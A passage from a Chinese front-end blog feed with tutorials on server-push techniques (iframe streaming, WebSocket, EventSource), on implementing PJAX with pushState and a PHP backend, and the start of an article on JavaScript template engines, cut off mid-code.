class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(ifr.<span class="property">readyState</span> == <span class="string">&quot;interactive&quot;</span>)&#123;</span><br><span class="line">                <span class="comment">// 处理数据，同上</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 重新建立链接</span></span><br><span class="line">            <span class="keyword">if</span>(ifr.<span class="property">readyState</span> == <span class="string">&quot;complete&quot;</span>)&#123;</span><br><span class="line">                <span class="built_in">clearInterval</span>(timer);</span><br><span class="line"></span><br><span class="line">                <span class="title function_">dataStream</span>(url);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">16</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>定时去监听iframe的readystate的变化，从而获取数据流，不过，上面的处理方式还是存在问题。数据流实现\服务器推"数据的原理是什么呢，简单点说，就是文档(数据)还没有加载完，这个时候浏览器的工作就是去服务器拿数据完成文档(数据)加载，我们就是利用这点，给浏览器塞点东西过去~ 所以上述利用iframe的方式获取数据，会使浏览器一直处于加载状态，title上的那个圈圈一直在转动，鼠标的状态也是loading，这看着是相当不爽的。幸好，IE提供了HTMLFile对象，这个对象就相当于一个内存中的Document对象，它会解析文档。所以我们创建一个HTMLFile对象，在里面放置一个IFRAME来连接服务器。这样，各种浏览器就都支持了。</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(isIE)&#123;</span><br><span class="line">    var dataStream = <span class="keyword">function</span>(url)&#123;</span><br><span class="line">        var doc = <span class="keyword">new</span> <span class="constructor">ActiveXObject(<span class="string">&quot;HTMLFile&quot;</span>)</span>,</span><br><span class="line">            ifr = doc.create<span class="constructor">Element(<span class="string">&quot;iframe&quot;</span>)</span>,</span><br><span class="line">            timer, d;</span><br><span class="line"></span><br><span class="line">        doc.write(<span class="string">&quot;&lt;body&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ifr.src = url;</span><br><span class="line">        doc.body.append<span class="constructor">Child(<span class="params">ifr</span>)</span>;</span><br><span class="line"></span><br><span class="line">        d = ifr.contentWindow.document;</span><br><span class="line"></span><br><span class="line">        timer = set<span class="constructor">Interval(<span class="params">function</span>()</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(d.readyState<span class="operator"> == </span><span class="string">&quot;interactive&quot;</span>)&#123;</span><br><span class="line">                <span class="comment">// 处理数据，同上</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 重新建立链接</span></span><br><span class="line">            <span class="keyword">if</span>(d.readyState<span class="operator"> == </span><span class="string">&quot;complete&quot;</span>)&#123;</span><br><span class="line">                clear<span class="constructor">Interval(<span class="params">timer</span>)</span>;</span><br><span class="line"></span><br><span class="line">                data<span class="constructor">Stream(<span class="params">url</span>)</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">16</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></body><h4>4.websocket</h4><p>websocket是前端一个神器，ajax用了这么久了，相关技术也是很成熟，不过要实现个数据的拉取确实十分不易，从上面的代码中也看到了，各种兼容性问题，各种细节处理问题，自从有了websocket，哈哈，一口气上五楼...</p><figure class="highlight wren"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">ws</span> <span class="operator">=</span> <span class="variable">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://www.example.com:8888&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">ws</span>.<span class="property">onopen</span> <span class="operator">=</span> <span class="title function_">function</span>(<span class="params">evt</span>)&#123;&#125;;</span><br><span class="line"><span class="variable">ws</span>.<span class="property">onmessage</span> <span class="operator">=</span> <span class="title function_">function</span>(<span class="params">evt</span>)&#123;</span><br><span class="line">    <span class="title function_">deal</span>(<span class="variable">evt</span>.<span class="property">data</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">ws</span>.<span class="property">onclose</span>  <span class="operator">=</span> <span class="title function_">function</span>(<span class="params">evt</span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ws.close();</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>新建一个WebSocket实例，一切就OK了，<code>ws://</code> 是websocket的连接协议，8888为端口号码。onmessage中提供了data这个属性，相当方便</p><h4>5.EventSource</h4><p>HTML5中提供的EventSource这玩意儿，这是无比简洁的服务器推送信息的接受函数。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> EventSource(<span class="string">&quot;test.php&quot;</span>).onmessage=<span class="keyword">function</span>(<span class="params">evt</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(evt.data);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简洁程度和websocket是一样的啦，只是这里有一个需要注意的地方，test.php输出的数据流应该是特殊的MIME类型，要求是"text/event-stream"，如果不设置的话，你试试~ （直接抛出异常）</p><h4>6.ActionScript</h4><p>情非得已就别考虑这第六种方式了，虽说兼容性最好，要是不懂as，出了点bug你也不会调试。</p><p>具体实现方法：在 HTML 页面中内嵌入一个使用了 XMLSocket 类的 Flash 程序。JavaScript 通过调用此 Flash 程序提供的套接口接口与服务器端的套接口进行通信。JavaScript 在收到服务器端以 XML 格式传送的信息后可以很容易地控制 HTML 页面的内容显示。</p><h4>7.Java Applet套接口</h4><p>这玩意儿原理和Flash类似，不过我不懂，就不细说了。</p><h3>三、后端处理方式</h3><p>本文主要是总结Javascript的各种通讯方式，后端配合node来处理，应该是挺给力的。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> conns = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ws = require(<span class="string">&quot;websocket-server&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> server = ws.createServer();</span><br><span class="line"></span><br><span class="line">server.addListener(<span class="string">&quot;connection&quot;</span>, <span class="keyword">function</span>(<span class="params">connection</span>)&#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;Connection request on Websocket-Server&quot;</span>);</span><br><span class="line">  conns.<span class="built_in">push</span>(connection);</span><br><span class="line">  connection.addListener(<span class="string">&#x27;message&#x27;</span>,<span class="keyword">function</span>(<span class="params">msg</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.<span class="built_in">log</span>(msg);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;conns.<span class="built_in">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(conns[i]!=connection)&#123;</span><br><span class="line">                conns[i].send(msg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure><p>下面是一个php的测试demo。</p><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">header(&#x27;Content-Type<span class="symbol">:text/html</span><span class="comment">; charset=utf-8&#x27;);</span></span><br><span class="line">while(<span class="number">1</span>)&#123;</span><br><span class="line">    echo date(&#x27;Y-m-d H<span class="symbol">:i</span><span class="symbol">:s</span>&#x27;)<span class="comment">;</span></span><br><span class="line">    flush()<span class="comment">;</span></span><br><span class="line">    sleep(<span class="number">1</span>)<span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>四、web 通信方式利弊分析</h3><ul><li>轮询，这种方式应该是最没技术含量的，操作起来最方便，不过是及时性不强，把定时器的间隔时间设置的短一些可以稍微得到缓和。</li><li>长轮询，算是比较不错的一个web通讯方式，不过每次断开连接，比较耗服务器资源，客户端到无所谓。</li><li>数据流，他和长轮询不同之处是接受数据的时间不一样，数据流是readystate为3的时候接受，低版本IE不太兼容，处理起来略麻烦，而且还要自己设计数据传输协议。不过他对资源的消耗比上面几种都可观。</li><li>websocket和EventSource，两个利器，不过，没几个浏览器支持，这是比较让人伤心~</li><li>ActionScript和Java Applet，两者都是需要在客户端安装插件的，一个是Flash插件，一个是Java插件，而且搞前端的人一般对这东西不太熟悉，如果没有封装比较好的库可以使用，那建议还是别用了。</li></ul><h3>五、参考资料</h3><ul><li><a href="http://www.ibm.com/developerworks/cn/web/wa-lo-comet/" target="_blank">http://www.ibm.com/developerworks/cn/web/wa-lo-comet/</a> Comet：基于 HTTP 长连接的\服务器推"技术</li><li><a href="http://blog.csdn.net/yankai0219/article/details/8208776" target="_blank">http://blog.csdn.net/yankai0219/article/details/8208776</a> HTTP协议中长连接、短连接</li><li><a href="http://www.web-tinker.com/" target="_blank">http://www.web-tinker.com/</a> comet系列文章 <strong>推荐<a href="http://www.web-tinker.com/rss.xml" target="_blank">订阅</a></strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PJAX的实现与应用</title>
      <link href="/blog/2013/12/06/cb-history-api-in-html5/"/>
      <url>/blog/2013/12/06/cb-history-api-in-html5/</url>
      
        <content type="html"><![CDATA[<h3>一、前言</h3><p>web发展经历了一个漫长的周期，最开始很多人认为Javascript这们语言是前端开发的累赘，是个鸡肋，那个时候人们还享受着从一个a链接蹦到另一个页面的web神奇魔术。后来随着JavaScript的不断更新换代，他的功能不仅仅是为网页添加一点特效了，语言本身的加强以及对DOM操作能力的提升让他在前端大放光彩。尤其是ajax的出现，让JavaScript以及整个web的发展翻开了崭新的一页。</p><p>利用ajax局部刷新页面，相信很多人玩得相当熟练了。如果整个页面的刷新都是使用ajax，我们可以称之为一个webapp，所有的逻辑都是在当页处理，这种形式的页面带来的体验是十分不错的，减少了那些比较\冗余"的页面跳转、新开页面等。不过，webapp的代码是十分不好维护的，页面逻辑太多太深，出点小问题，整个页面就会瘫痪，而且不方便定位bug，可维护性很低。</p><h3>二、PJAX的实现与应用</h3><h4>1.场景再现-ajax弊端</h4><p>ajax是一个非常好玩的小东西，不过用起来也会存在一些问题。</p><p>我们可以利用ajax进行无刷新改变文档内容，但是没办法去修改URL，有童鞋要问，这里为什么一定要修改URL呢？一个URL代表一个特定的网络资源，ajax修改了页面的内容，所以用不同的URL去标识他们，这个还是挺有必要的。</p><p>比如我们设计了一个单词查询的页面，比较合理的UR应该是<a href="http://example.com/word">http://example.com/word</a>，不同的word对应不同的内容，但是如果整个页面都是ajax实现，我们就没法去修改/word了，当然我们可以使用hash如http://example.com#word，但这样就不能很好的处理浏览器的前进和后退问题。如：在页面中查询了单词A的翻译，接着又查询了单词B，这个时候浏览器的浏览历史会生成http://example.com#A和http://example.com#B两个记录，可是当我们从B转回A的时候，AJAX的效果还停留在B的状态（页面显示的还是单词B的翻译）。部分浏览器对此问题引入了onhashchange的接口，只要URL的hash值发生变化，我们的程序就可以监听并做出相应。不过对于那些木有这个接口的浏览器，就得定时去判断hash的变化了。</p><p>而这样的方式对搜索引擎是十分不友好的，twitter和google约定使用hash bang (#!xxx)，也就是hash后面的第一个字符为感叹号，这样的网址他们是会爬取的，但是其他搜索引擎不支持。PJAX可以在改变页面内容的同时也改变他的URL，下面来说说PJAX和他的应用。</p><h4>2.什么是PJAX</h4><p>history API中有几个新特性，分别是history.pushState和history.replaceState，我们把pushState+AJAX进行封装，合起来简单点叫，就是PJAX~ 虽说实现技术上没什么新东西，但是概念上还是有所不同的。</p><p>PJAX的基本思路是，用户点击一个链接，通过ajax更新页面变化的部分，然后使用HTML5的pushState修改浏览器的URL地址，这样有效地避免了整个页面的重新加载。如果浏览器不支持history的两个新API或者JS被禁用了，那这个链接就只能跳转并重新刷新整个页面了。和传统的ajax设计稍微不同，ajax通常是从后台获取JSON数据，然后由前端解析渲染，而PJAX请求的是一个在服务器上生成好的HTML碎片，如下图所示：</p><p><img src="https://images.cnitblog.com/blog/387325/201312/06100721-6cff436c5fc84037807d4cce03658f9b.jpg" alt="" width="602" height="451"></p><p>客户端向服务器发送一个普通的请求（1），其实也就是点击了一个链接，服务器会相应这个请求（2），返回一个html文档。客户端向服务器发送一个有PJAX标志的请求（3），此时服务器只返回一个html碎片（4）。但是这两次请求都让客户端的URL变化了，希望上面的说明可以让你明白了PAJX和AJAX的区别了。</p><h4>3.PJAX的实现</h4><p>先看一个小DEMO吧，这个DEMO也写了我半个多小时，看之前先说明一下，打开你的<strong>现代浏览器</strong>（chrome，Firefox，opera，IE9+等），进入gallery页面，查看图片的时候注意观察浏览器的title和url变化，点击前进后退按钮也注意查看其变化。我已经在浏览历史管理中push了三条历史记录。</p><p>DEMO地址：<a href="http://qianduannotes.duapp.com/demo/PJAX/index.html" target="_blank">http://qianduannotes.duapp.com/demo/PJAX/index.html</a></p><p>如果你还没有理解上面说的PJAX和AJAX的区别，看完这个demo，你应该有所领悟吧！在URL变化之后，页面并没有刷新，而是继续完成自己的动画（demo中为fadeOut）。</p><p>在HTML4，Histroy对象有下面属性方法：</p><ul><li><code>length</code>：历史堆栈中的记录数。</li><li><code>back()</code>：返回上一页。</li><li><code>forward()</code>：前进到下一页。</li><li><code>go([delta])</code>：delta是个数字，如果不写或为0，则刷新本页；如果为正数，则前进到相应数目的页面；若为负数，则后退到相应数目的页面。</li></ul><p>在HTML5中，新增了两个方法：</p><ul><li><code>pushState(data, title [, url])</code>：往历史堆栈的顶部添加一条记录。data为一个对象或null，它会在触发window的popstate事件（window.onpopstate）时，作为参数的state属性传递过去；title为页面的标题，但当前所有浏览器都忽略这个参数；url为页面的URL，不写则为当前页。</li><li><code>replaceState(data, title [, url])</code>：更改当前页面的历史记录。参数同上。这种更改并不会去访问该URL。</li></ul><p>当点击\上一张"、\下一张"这两个链接的时候，首先通过pushState修改URL以及修改document.title，那这个时候你就可以当做文档已经进入了另外一个链接了，然后该干什么干什么。demo中是让图片fadeOut，fadeOut完了之后让浏览器去加载资源，这个步骤就是正常的AJAX操作啦，没有什么特殊之处了~</p><p>因为只准备了三张图片，所有后台写的也比较简单：</p><figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">error_reporting</span>(<span class="literal">false</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;HTTP_X_PJAX&#x27;</span>, <span class="variable">$_SERVER</span>) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_PJAX&#x27;</span>] === <span class="string">&#x27;true&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="variable">$num</span> == <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;imgwrap&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./images/1.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;num=2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;next&quot;</span>&gt;</span>下一张&lt;gt;&lt;gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$num</span> == <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;imgwrap&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./images/2.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;num=1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;previous&quot;</span>&gt;</span>&lt;lt;&lt;lt;上一张<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;num=3&quot;</span> <span class="attr">class</span>=<span class="string">&quot;next&quot;</span>&gt;</span>下一张&lt;gt;&lt;gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;imgwrap&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./images/3.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;num=2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;previous&quot;</span>&gt;</span>&lt;lt;&lt;lt;上一张<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p>&nbsp;上面那张图中，我们看到了，并不是每个连接都使用PJAX来加载，如果有X_PJAX标识，我们才会添加相应的处理。js中稍加注意可以看到：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;./interface.php&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;num&quot;</span>: num</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;dataType&quot;</span>: <span class="string">&quot;html&quot;</span>,</span><br><span class="line">    <span class="string">&quot;headers&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;X_PJAX&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;请求中：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Accept</span>:text/html, */*; q=<span class="number">0</span>.<span class="number">01</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding:gzip,deflate,sdch</span><br><span class="line"><span class="attribute">Connection</span>:keep-alive</span><br><span class="line"><span class="attribute">Host</span>:qianduannotes.duapp.com</span><br><span class="line"><span class="attribute">User</span>-Agent:Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">6</span>.<span class="number">1</span>) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">31</span>.<span class="number">0</span>.<span class="number">1650</span>.<span class="number">63</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">X</span>-Requested-With:XMLHttpRequest</span><br><span class="line"><span class="attribute">X_PJAX</span>:true</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;我在请求的header中加了一个X_PJAX的头，而后台在处理的时候也做了判断：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_pjax</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;HTTP_X_PJAX&#x27;</span>, <span class="variable">$_SERVER</span>)</span><br><span class="line">            &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_PJAX&#x27;</span>] === <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;并不是一定要求在header头部中加入X_PJAX的信息，你也可以在url中加入相关的参数，比如:http://example.com?pjax=1，或者其他方式，只要前后端达到一个共识就行。</p><h3>三、开源的PJAX库</h3><p>已经有人对这个东西做了封装，我就不重复造轮子了。</p><ul><li>welefen封装的库，对jquery、qwrap和kissy都做了封装，<a href="//github.com/welefen/pjax" target="_blank">github地址</a></li><li>Yahoo团队 <a href="http://yuilibrary.com/yui/docs/pjax/" target="_blank">PJAX地址</a></li></ul><p>并不是页面中所有的链接都需要使用PJAX加载，所有在需要这个东西的a标签上加一个属性，如<code>data-pjax=true</code>，然后统一添加事件。</p><h3>四、注意事项</h3><ol><li>如果浏览器不支持pushState接口函数，那就只能退化为ajax或者使用hash bang了~</li><li>本地环境下使用的话，浏览器会报错：`Uncaught SecurityError: A history state object with URL file:///E:/baidu_app/demo/PJAX/pic-2' cannot be created in a document with origin 'null'. ，所以如果你要测试的话，请把代码丢到服务器上！</li><li>为了得到更好的体验，PJAX经常配合localStorage来使用，把请求到的内容缓存到本地，再一次请求的时候先从本地查看。如果你的内容是动态变化的，缓存的时候加一个缓存时间，方便更新缓存。</li><li>还有一个容易忽略的东西是统计，使用PJAX只会局部刷新页面，如果忽略了对统计函数的更新，那就会让你失去很多数据。</li></ol><h3>五、参考资料</h3><ul><li><a href="http://www.welefen.com/pjax-for-ajax-and-pushstate.html" target="_blank">http://www.welefen.com/pjax-for-ajax-and-pushstate.html</a> welefen</li><li><a href="http://ntotten.com/2012/04/09/building-super-fast-web-apps-with-pjax/" target="_blank">http://ntotten.com/2012/04/09/building-super-fast-web-apps-with-pjax/</a> Nathan Totten</li><li><a href="http://yuilibrary.com/yui/docs/pjax/" target="_blank">http://yuilibrary.com/yui/docs/pjax/</a> YUI Pjax</li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> PJAX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript模板引擎原理，几行代码的事儿</title>
      <link href="/blog/2013/12/03/cb-principle-of-javascript-template/"/>
      <url>/blog/2013/12/03/cb-principle-of-javascript-template/</url>
      
        <content type="html"><![CDATA[<h3>一、前言</h3><p>什么是模板引擎，说的简单点，就是一个字符串中有几个变量待定。比如：</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">var tpl = <span class="symbol">&#x27;Hei</span>, my name <span class="keyword">is</span> &lt;%name%&gt;, <span class="keyword">and</span> I\<span class="symbol">&#x27;m</span> &lt;%age%&gt; years old.&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过模板引擎函数把数据塞进去，</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="keyword">data</span> = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Barret Lee&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="string">&quot;20&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = tplEngine(tpl, <span class="keyword">data</span>);</span><br><span class="line"><span class="comment">//Hei, my name is Barret Lee, and I&#x27;m 20 years old.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那这玩意儿有什么作用呢？其实他就是一个预处理器（preprocessor），搞php开发的童鞋对Smarty必然是十分熟悉，Smarty是一个php模板引擎，tpl中待处理的字符通过数据匹配然后输出相应的html代码，加之比较给力的缓存技术，其速度和易用性是非常给力的！JS Template也是一样的，我们的数据库里保存着数以千万计的数据，而每一条数据都是通过同一种方式输入，就拿上面的例子来说，我们不可能在数据库里存几千条"Hei, my name..."，而是只保存对应的name和age，通过模板输出结果。</p><p>JS模板引擎应该做哪些事情？看看下面一串代码：</p><figure class="highlight bnf"><table><tr><td class="code"><pre><span class="line">var tpl = &#x27;<span class="attribute">&lt;% for(var i = 0; i &lt; this.posts.length; i++) &#123;&#x27; +　</span></span><br><span class="line"><span class="attribute">    &#x27;var post = posts[i]; %&gt;</span>&#x27; +</span><br><span class="line">    &#x27;<span class="attribute">&lt;% if(!post.expert)&#123; %&gt;</span>&#x27; +</span><br><span class="line">        &#x27;<span class="attribute">&lt;span&gt;</span>post is null<span class="attribute">&lt;/span&gt;</span>&#x27; +</span><br><span class="line">    &#x27;<span class="attribute">&lt;% &#125; else &#123; %&gt;</span>&#x27; +</span><br><span class="line">        &#x27;<span class="attribute">&lt;a href=&quot;#&quot;&gt;</span><span class="attribute">&lt;% post.expert %&gt;</span> at <span class="attribute">&lt;% post.time %&gt;</span><span class="attribute">&lt;/a&gt;</span>&#x27; +</span><br><span class="line">    &#x27;<span class="attribute">&lt;% &#125; %&gt;</span>&#x27; +</span><br><span class="line">&#x27;<span class="attribute">&lt;% &#125; %&gt;</span>&#x27;;</span><br></pre></td></tr></table></figure><p><span>一个基本的模板引擎至少可以保证上面的代码可以正常解析。如送入的数据是：</span></p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">var data</span> = &#123;</span><br><span class="line">    <span class="string">&quot;posts&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;expert&quot;</span>: <span class="string">&quot;content 1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;time&quot;</span>: <span class="string">&quot;yesterday&quot;</span></span><br><span class="line">    &#125;,&#123;</span><br><span class="line">        <span class="string">&quot;expert&quot;</span>: <span class="string">&quot;content 2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;time&quot;</span>: <span class="string">&quot;today&quot;</span></span><br><span class="line">    &#125;,&#123;</span><br><span class="line">        <span class="string">&quot;expert&quot;</span>: <span class="string">&quot;content 3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;time&quot;</span>: <span class="string">&quot;tomorrow&quot;</span></span><br><span class="line">    &#125;,&#123;</span><br><span class="line">        <span class="string">&quot;expert&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;time&quot;</span>: <span class="string">&quot;eee&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;可以输出：</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;#&quot;</span>&gt;content <span class="number">1</span> <span class="keyword">at</span> yesterday&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;#&quot;</span>&gt;content <span class="number">2</span> <span class="keyword">at</span> today&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;#&quot;</span>&gt;content <span class="number">3</span> <span class="keyword">at</span> tomorrow&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line">&lt;span&gt;<span class="built_in">post</span> is <span class="literal">null</span>&lt;/span&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>先戳这个</span><a href="http://qianduannotes.duapp.com/demo/javascript-template.html" target="_blank">demo</a>看看<span>。</span>&nbsp;</p><p>下面就具体说说这个模板引擎的原理是啥样的。</p><h3>二、JS模板引擎的实现原理</h3><h4><strong>1.正则抠出要匹配的内容</strong></h4><p>针对这一串代码，通过正则获取内容</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">var tpl</span> = <span class="string">&#x27;Hei, my name is &lt;%name%&gt;, and I\&#x27;m &lt;%age%&gt; years old.&#x27;</span>;</span><br><span class="line"><span class="attribute">var data</span> = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Barret Lee&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="string">&quot;20&quot;</span></span><br><span 